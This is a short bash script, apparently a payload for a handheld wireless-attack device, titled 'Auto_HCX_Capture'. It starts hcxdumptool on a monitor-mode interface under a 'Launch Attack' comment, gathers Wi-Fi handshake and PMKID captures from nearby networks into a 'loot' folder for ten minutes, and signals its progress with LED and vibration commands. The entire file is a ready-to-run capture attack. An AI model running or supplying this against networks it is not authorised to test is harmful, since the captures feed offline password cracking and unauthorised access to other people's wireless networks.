#!/bin/bash
# Title: Auto_HCX_Capture
INTERFACE="wlan1mon"
LOOT_DIR="/root/loot/handshakes"
mkdir -p $LOOT_DIR

# Start Signal (Blue)
VIBRATE 50 100
LED B 100
LOG "Field Capture Started..."

# Launch Attack
FILE_NAME="$LOOT_DIR/capture_$(date +%s).pcapng"
hcxdumptool -i $INTERFACE -w "$FILE_NAME" &
HCX_PID=$!

# 10 Minute Monitor Loop
for i in {1..10}; do
    LED Y 100
    sleep 30
    LED FINISH
    sleep 30
    LOG "Minute $i/10 complete."
done

# Success Signal (Green)
kill -2 $HCX_PID
VIBRATE 100 800
LED G 100
LOG "Capture Complete: $(basename $FILE_NAME)"
